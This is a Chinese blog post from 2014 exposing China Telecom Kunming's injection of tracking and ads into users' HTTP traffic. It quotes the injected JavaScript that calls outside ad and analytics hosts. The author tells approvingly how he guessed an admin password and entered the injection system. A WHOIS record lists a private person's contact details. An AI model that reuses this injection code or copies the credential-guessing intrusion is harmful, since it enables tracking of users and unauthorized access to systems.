---
layout: post
title: 云南电信昆明地区运营商劫持记录
category: criticism
tags: [云南, 昆明, 运营商劫持]

---

大概7月下旬开始，发现上网的时候网页里偶尔会有个百度统计的图标，一般的网站即使使用统计图标，一般也会合理放置，而不会随意放在网页的头部或底部未对齐的位置。尤其是居然我访问一些国外网站的时候页面上都出现统计图标，让我产生了巨大的疑惑。最先考虑到是否是最近安装的几个Chrome插件捣的鬼，于是详细的排查了一遍所有Chrome插件的代码，完全搜不到任何跟百度统计相关的代码。之后将所有插件屏蔽，再访问网络时，还是偶尔会出现这个统计图标，但从中只看到统计id是同一个，并没有更多的发现。

<figure>
	<img src="http://mbed.qiniudn.com/yanjunyi.com/img/telecom-intercept/telecom-intercept-4.jpg" />
	<figcaption>AliceUI是支付宝前端的专业网站，阿里系一般不会使用百度统计，而且即使使用也不会将图标展示在一个完全无法理解的位置</figcaption>
</figure>

<figure>
	<img src="http://mbed.qiniudn.com/yanjunyi.com/img/telecom-intercept/telecom-intercept-5.jpg" />
	<figcaption>访问国外网站时也出现百度统计的图标</figcaption>
</figure>

之后几天这个现象一直在持续，而终于有一次在我刷新正处于开发工作下的本地网页时也出现了这个统计图标，我自己写的网页我肯定不会放个莫名其妙的百度统计代码进去，所以一定要一探究竟。正好我开着Chrome的控制台，很快就发现我在页面里正常引入的一个CDN上的JS文件，被重复引用了一次，而且在第二次引用上加上了一个奇怪的去缓存参数：

	<script src="http://elfjs.qiniudn.com/code/elf-0.5.0.min.js"></script>
	<script language="javascript" src="http://elfjs.qiniudn.com/code/elf-0.5.0.min.js?_veri=20121009"></script>

再切换到source面板，找到第一个本应该正常引用的JS，打开内容一看，正是注入百度统计代码的内容：

	document.write('<script language="javascript" src="http://elfjs.qiniudn.com/code/elf-0.5.0.min.js?_veri=20121009"><\/script>');
	var _bdhmProtocol=(("https:"==document.location.protocol)?" https://":" http://");document.write(unescape("%3Cscript src='"+_bdhmProtocol+"hm.baidu.com/h.js%3F1e62cf3c2928eb5xxxxxxxxxxxxxxxxx' type='text/javascript'%3E%3C/script%3E"));

到这很清楚了，我网络请求中的一个JS请求内容被替换成了劫持代码，加上缓存参数重新请求正确的代码，同时写入自己要注入的统计代码。看到这里我还是不能特别确定是运营商的劫持，因为放个统计代码要是只是为了统计展现量，那可能意义不大，或者说只是为了提前了解投放会带来的压力，并没有产生实质的商业行为。另外这么明显的放一个统计图标在劫持代码里手段实在是太拙劣，好像完全不知道可以在百度统计后台里关闭图标的显示，毕竟没有这个图标显示，谁知道有奇怪的东西注入到了访问的网页里？

为了求证，我特地将这个统计ID向百度统计的工程师咨询，他们了解到我的情况后，大致判断出可能是运营商的劫持行为，只是不清楚什么原因暂时没有投放广告的行为。既然是这样的结论，我又查了知乎关于运营商劫持的两个帖子，基本是打10000号投诉或者只能忍。鉴于暂时还没有投放广告的过分行为，我也不是处女座，暂时只能忍忍了。

## 8月7日 ##

可过了没几天，当我访问<http://segmentfault.com/>网站时，突然右下角出现了“90后性感校花闺房幽会土豪捧场一掷千金”为主体**不堪入目**的魅惑妹子图片广告！我立即反应到，像Segmentfault这么小众技术性的网站，应该不会挂如此低俗的广告，而且好像没有听说他们网站投放过这类悬浮广告。再仔细一看左上角，百度统计的图标又出现在网页上，而专业的技术网站也不会犯这种低级错误。我立即就猜到一定是运营商劫持终于开始投放广告进行非法牟利了，而前期的准备只是为了了解投放影响的数量级，估计以便计算服务器支撑性能。

<figure>
	<img src="http://mbed.qiniudn.com/yanjunyi.com/img/telecom-intercept/telecom-intercept-6.jpg" />
	<figcaption>在Segmentfault技术问答网站上突然出现运营商劫持投放的广告</figcaption>
</figure>

这个广告跳转的链接是`http://x.kuwo.cn/KuwoLive/OpenLiveRoomLink?from=2066100001`，经过跳转最后停留在`http://x.kuwo.cn/360071?from=2066100001`，是酷我音乐的视频在线直播平台。

运营商终于暴露出卑鄙无耻下作的一面，完全无视宽带付费用户的合法权益，对用户的网络实施着暴力强奸！根据网上查到的资料，这类劫持已经不是修改DNS就能解决的，他偷换了用户正常访问的HTTP包，完全没有办法消除。从此延伸出来电信可以劫持任意的HTTP访问请求，那么也可以在网页上注入任何的代码，只要他想，甚至完全可以窃取所有用户的各种网站非加密的账号，这将会多么可怕？以这种无节操非法牟利的尿性下去，我只能往最阴暗的方向去发散思维。

## 8月12日 ##

几天后，我再次打开Chrome控制台，看到注入代码中增加了一行广告代码：

	document.write('<script language="javascript" src="http://61.144.xxx.xxx:88/lighttpd/default/re/re.php?src=t0035&t='+encodeURIComponent(document.title)+'&ci=3550963991&r='+encodeURIComponent(document.referrer)+'"><\/script>');

通过这个请求展示出的广告内容。从这里我产生了极大的好奇，广告物料存放在的是一个非常规HTTP端口和无域名的服务器IP，不由得把这个地址拿出来单独访问看看会有什么结果。进入服务器根路径就是一个CentOS的Apache服务初始页，没有太离奇。而当我一层一层目录切换进去以后，看到了一个很有意思的东西：

<figure>
	<img src="http://mbed.qiniudn.com/yanjunyi.com/img/telecom-intercept/telecom-intercept-server.jpg" />
	<figcaption>Apache服务非但没有关闭默认目录索引，甚至还看到部署了一个名叫“ipush”的应用服务（此截图产生于8月13日，本想补充说明，但当天弹出广告IP已经发生更换）</figcaption>
</figure>

我先去`re`目录中搜罗了一番，除了一堆没有被服务器解析的`.inc`文件透露了服务器memcache的本地端口以外，没找到数据库密码之类的关键信息。而ipush这个东西刚好是前几天Google搜索“[电信 运营商 劫持](https://www.google.com.hk/search?q=ipush+%E7%94%B5%E4%BF%A1&oq=ipush+%E7%94%B5%E4%BF%A1&aqs=chrome..69i57j69i61.5223j0j7&sourceid=chrome&es_sm=119&ie=UTF-8)”里看到的几篇篇文章：

* [重庆电信建IPUSH系统 为宽带业务保驾护航](http://www.zzchn.com/news/20070928/49398.shtml)
* [四川电信的IPUSH广告真牛，又升级了。。](http://home.itchaguan.com/thread-1526-1-1.html)
* [ipush推送广告简介](http://wenku.baidu.com/view/87cbdfd7c1c708a1284a44a8.html)

> 网络定向直投系统（也称IPUSH)，是由中国电信开发的划时代网络技术，可以以各种格式定时、定点将广告推送到网络在线用户端的浏览主页面。通过这个传播平台,不论电信用户在IE浏览器地址栏中输入任何网址进行浏览，网络定向直投系统均可将广告主动送达用户，不依赖于某个固定的网站。可以自由选择目标市场区域，灵活投放，全面覆盖。
> 
> ——以区域为单位,以宽带用户为依托的电信级网关广告。

* [Sunway iPUSH信息主动推送系统](http://www.sunways.com.cn/product_detail.asp?productID=13)

> ### （1）系统介绍 ###
> 
> 互联网信息推送技术是近年来发展起来的一种基于协议分析的全新的互联网应用技术，在理论上它是只有电信宽带运营商才能掌握的业务资源，并具有强制性、实时性、交互性和选择性（分众性）等特性。
> 
> iPUSH互联网信息推送系统可以强制推送信息到电信所有宽带上网客户的终端桌面，因此，它不仅是电信运营商进行业务营销推广的良好工具，同时也是ISP客户上网接入的强制门户、独占资源的广告平台、互联星空SP业务推广平台、互联网内容控制、网络应用协议监测和检测控制平台….等。
> 
> ### （2）技术说明 ###
> 
> iPUSH技术是一种由协议分析处理核心系统（协议分析处理器）发起的、直接向上网浏览终端推送指定信息的网络技术。协议分析处理核心系统通过数据采集端口（光纤链路分光端口）实时获取网骨干网出口节点的http协议的网络数据报文，通过分析获取上网客户浏览数据。在完成了上述报文分析的同时，按http协议规范向目标客户推送指定信息内容。目标客户的识别（上网帐号、主叫号码）可以通过宽带RADIUS认证后台数据接口或专门的TCA认证模块完成，TCA认证模块工作原理也是基于对RADIUS协议认证数据包的协议分析为基础的。
> 
> ### （3）功能特点 ###
> 
> 宽带运营支撑平台的“iPUSH互联网信息推送”系统可以有效管理推送内容，推送目标客户对象，推送的计划策略。采用基于web的管理后台，操作使用简便，并可以远程业务管理，功能强大，特点鲜明：
> 
> 0. 系统可以从上网帐号、主叫号码、接入号码、端口类型、客户IP、Nas IP、Redius IP等七项标示对目标客户的甄别，极大地提高了推送业务的灵活性和选择性。
> 0. 系统支持目标客户白名单的批量数据导入和管理，极大地方便了与其他业务系统，如BOSS系统、营帐系统、MSS系统的数据交换，方便运营商灵活细分客户进行推送。
> 0. 系统支持推送黑名单管理，可以永久避免对敏感客户的推送。
> 0. 系统有强大的监控功能和日志管理，不仅可以对每一个推送任务进行实时的推送数据统计，还可以提供推送内容点击、提交等事件统计。
> 0. 系统有灵活的角色权限管理，可以实现运营商各个业务、技术部门同时协调进行推送作业，各类权限均可以细分和重组。
> 0. 系统可以管理各类推送信息的样式模版。根据使用经验灵活编制的各类模版（弹出/嵌入式窗口尺寸规格、推送到达后停止方式、窗口停留和关闭方式等…），可以随推送内容和推送对象的不同而灵活选择。既支持弹出式窗口模版，还支持嵌入式推送模版，避免浏览器屏蔽弹出窗口。
> 0. 系统还提供了简便的立即测试工具，可以随时测试系统的性能、推送内容页面。
> 0. 系统支持并行推送任务管理，可以同时并发对不同目标客户群推送不同的信息页面，并且能对并行推送任务进行优先级设定。
> 0. 系统对每一个推送计划任务都能进行灵活的策略管理，例如设定推送时间周期、每天推送时间段、每次客户上线后的推送次数、推送信息页面样式模版设定等等…。

主要说的成都和重庆的电信都应用上了ipush系统，该系统已经可以分析用户浏览网页的行为，并做到以用户数据来进行广告精准定位，强行投放。这简直是互联网广告行业里正当竞争的公司梦寐以求的数据和投放方式啊！这意思也就是，不管你在家里干什么，电信都可以直接跑进你家的房间给你发个传单！当网民们还在吐槽百度的医疗广告和360安全流氓的时候，在超级流氓运营商中国电信面前，这些都弱爆了！

在这么强大的系统门口，我实在忍不住好奇，把鼠标移动到`ipush2/`的目录链接上，使劲的按了下去。没有意外，这是个需要管理员账号登陆的入口页面，但更没有意外的是，我竟然一次就猜中了账号和密码，顺利的登录进了传说中的ipush系统！从暴露百度统计图标，到暴露服务器系统信息，再到管理平台弱密码，完全可以判断出根本就是个不懂多少技术且毫无安全常识的外行在玩弄上百万的昆明电信宽带用户！

好了，好戏现在才开始，当我漫步于ipush系统的各个页面时，心中只有愤怒和悲凉。

<figure>
	<img src="http://mbed.qiniudn.com/yanjunyi.com/img/telecom-intercept/telecom-intercept-ipush.jpg" />
	<figcaption>进入ipush首页，是当前时间一天内的系统运行概要统计数据。下午13:55分时，该已经有81万次访问请求经过了系统的劫持，但当天还没有展示广告。</figcaption>
</figure>

<figure>
	<img src="http://mbed.qiniudn.com/yanjunyi.com/img/telecom-intercept/telecom-intercept-ads.jpg" />
	<figcaption>已经在系统中创建好的广告素材，其中就有8月7日注入到我的访问里的广告图片</figcaption>
</figure>

<figure>
	<img src="http://mbed.qiniudn.com/yanjunyi.com/img/telecom-intercept/telecom-intercept-ad1.jpg" />
	<figcaption>最早一次这个广告跳转链接是到<code>www.woxiu.com</code></figcaption>
</figure>

<figure>
	<img src="http://mbed.qiniudn.com/yanjunyi.com/img/telecom-intercept/telecom-intercept-adstyle.jpg" />
	<figcaption>这条广告的投放配置，全时段，全区域，且样式选择中很明确的就有“劫持”二字</figcaption>
</figure>

<figure>
	<img src="http://mbed.qiniudn.com/yanjunyi.com/img/telecom-intercept/telecom-intercept-addemo2.jpg" />
	<figcaption>这个广告的demo页面</figcaption>
</figure>

<figure>
	<img src="http://mbed.qiniudn.com/yanjunyi.com/img/telecom-intercept/telecom-intercept-adstat2.jpg" />
	<figcaption>8月7日那天弹出那条广告的统计数据，一共有32万人看到了那条广告，3800多人点击，1.17%的点击率，远高于我所了解的其他互联网广告平均水平</figcaption>
</figure>

<figure>
	<img src="http://mbed.qiniudn.com/yanjunyi.com/img/telecom-intercept/telecom-intercept-newslist.jpg" />
	<figcaption>网址分类中的新闻类网址数据</figcaption>
</figure>

<figure>
	<img src="http://mbed.qiniudn.com/yanjunyi.com/img/telecom-intercept/telecom-intercept-realtimeuser.jpg" />
	<figcaption>实时用户访问信息，可以看到最近被劫持的用户正在访问哪些网站，以及网站的关键词</figcaption>
</figure>

<figure>
	<img src="http://mbed.qiniudn.com/yanjunyi.com/img/telecom-intercept/telecom-intercept-sitestat.jpg" />
	<figcaption>8月11日的劫持站点统计，可以看到上网用户中lol玩家居多</figcaption>
</figure>

<figure>
	<img src="http://mbed.qiniudn.com/yanjunyi.com/img/telecom-intercept/telecom-intercept-whitelist.jpg" />
	<figcaption>网站白名单，有132个网民常去的大站被加进了白名单，以免和这些知名网站产生纠纷</figcaption>
</figure>

<figure>
	<img src="http://mbed.qiniudn.com/yanjunyi.com/img/telecom-intercept/telecom-intercept-adminrecord.jpg" />
	<figcaption>管理员操作记录，最早一条广告素材是在8月4日添加的</figcaption>
</figure>

看到这里我什么也说不出，也不想说了。

以目前掌握的信息推测昆明电信只是刚刚拿到这个系统并进行测试，不说没有任何安全防范，而且第一个服务器IP是`103.242.xxx.xxx`属于北京市APNIC，13日弹广告的IP`61.144.xxx.xxx`又显示的是广东电信的地址，而两者的操作人员IP都是`123.119.188.141`查到的是北京联通，不清楚其中到底是什么关系。但是作恶的系统测试也是在作恶，丝毫不改变没有节操的本质。

除了将此文公布，实在找不到什么更好的方式以抵抗电信的运营商劫持。如有后续进展，会持续更新此文。

2014-08-20 更新
----------

最近发现打开百度首页还会偶然的被强制挂上一个计费名：`tn=93046097_7_pg`，网址变成：`http://www.baidu.com/?tn=93046097_7_pg`。看来这想着办法黑钱已经可以用昆明话“钻头觅缝”来形容了。

2014-11-09 更新
----------

10月以来，`103.242.xxx.xxx`这个广告投放系统又开始玩新花样，依旧是劫持外部 JS 请求替换的老办法，但投放的是 Hao123 的 iframe。而且最最 SB 的是投放代码写的有问题，一旦出广告，必然把页面撑爆错位。拜托代码能写的专业一点么！

<figure>
	<img src="http://mbed.qiniudn.com/yanjunyi.com/img/telecom-intercept/2014-11-08.jpg" />
	<figcaption>被注入 Hao123 的 iframe。我手动在控制台取消了这个本该是 1x1 大小的容器定位方式，否则页面会向右无限延伸，撑爆屏幕</figcaption>
</figure>

同时从 11 月 8 日开始，连手机上都有区别对待的劫持了。托管用的[广告家](http://adpro.cn/)，感觉这家广告商基本做的都是黑产业，没怎么见正经网站分发他们的广告。

<figure>
	<img src="http://mbed.qiniudn.com/yanjunyi.com/img/telecom-intercept/2014-11-08-mobile-1.png" />
	<figcaption>一早起来用手机测试正在开发的国外网站，下面赫然一大块广告</figcaption>
</figure>

<figure>
	<img src="http://mbed.qiniudn.com/yanjunyi.com/img/telecom-intercept/2014-11-08-mobile-2.jpg" />
	<figcaption>在浏览器中用手机模拟测试，也会出现这个广告</figcaption>
</figure>

2014-11-21 更新
----------

在国外网站[下载 Google Inbox APK](http://www.apkmirror.com/apk/google-inc/inbox/inbox-1-1-78614022-apk/) 的时候点击下载链接，首次下载的居然是一个 4M 大小的 APK，而不是 37M 的 Inbox APK。查看下载历史记录跳转到的地址是：

	http://112.117.219.35/down.myapp.com/myapp/smart_ajax/com.tencent.android.qqdownloader/997107_19531343_1415980200145.apk?mkey=5474bdb574b4fb2b&f=d388&p=.apk

还有一次跳转的是 360 的一个软件。总之我看到名字和大小不对立即停止了下载。理论上说国外网站即使做分润推介链接，也不应该做中国的软件，所以这应该也是运营商的劫持把戏。

2014-11-23 更新
----------

上去哪网时发现先跳转到一个其他网站：

	http://ceadx.agrantsem.com/clickentry?ccat=1130&csrc=106

然后带上了一个渠道参数尾巴再跳转到去哪：

	http://www.qunar.com/?ex_track=auto_53ce0f43

这个域名的 whois 信息：

	Domain Name:agrantsem.com
	Registry Domain ID:
	Registrar WHOIS Server: whois.hichina.com
	Registrar URL: http://www.net.cn/
	更新时间:2014-03-13T06:54:04Z
	Creation Date:2010-01-05T10:13:16Z
	Registrar Registration 过期时间:2017-01-05T10:13:16Z
	Registrar: HICHINA ZHICHENG TECHNOLOGY LTD.
	Registrar IANA ID: 420
	Registrar Abuse Contact Email: abuse@list.alibaba-inc.com
	Registrar Abuse Contact Phone: +86.4006008500
	Reseller:
	Domain 状态：clientTransferProhibited
	Registry Registrant ID:HC-485644583-CN
	Registrant Name:Kan Shi 
	Registrant Organization:Kan Shi 
	Registrant Street:425 Grant Ave,,
	Registrant City:Palo Alto
	Registrant State/Province:
	Registrant Postal Code:94306
	Registrant Country:CN
	Registrant Phone:+1.6503530239
	Registrant Phone Ext:
	Registrant Fax:+1.6503530239
	Registrant Fax Ext:
	Registrant Email:ikanshi@gmail.com
	Name Server:ns1.dnsv3.com
	Name Server:ns2.dnsv3.com
	DNSSEC:unsigned
	URL of the ICANN WHOIS Data Problem Reporting System: http://wdprs.internic.net/
	>>> Last update of WHOIS database:2014-03-13T06:54:04Z<<<

使用了`Apache Tomcat/7.0.42`作为 Web 服务器。

2014-11-25 更新
----------

在 V2EX 上还有其他人也发现了使用昆明电信时 APK 下载被劫持的情况：[下载 APK 文件经常被替换，怎样判断是不是被运营商劫持了？](https://v2ex.com/t/149254)

2014-12-03 更新
----------

发现这家公司和该劫持系统有关联：[中国电信 \| 十环大数据](http://www.10000data.net/)

以及昆明代理商：[昆明斌创科技](http://www.bc10000.net/) [手机网站](http://980606.3g.gitom.com/)

2015-01-05 更新
----------

<figure>
	<img src="http://mbed.qiniudn.com/yanjunyi.com/img/telecom-intercept/telecom-intercept-2015-01-05.jpg" />
	<figcaption>又在我开发测试页面的时候弹出右下角广告</figcaption>
</figure>

2015 年开始，劫持系统又更换了广告投放平台：[花生米](http://hsmkj.net/)

-EOF-
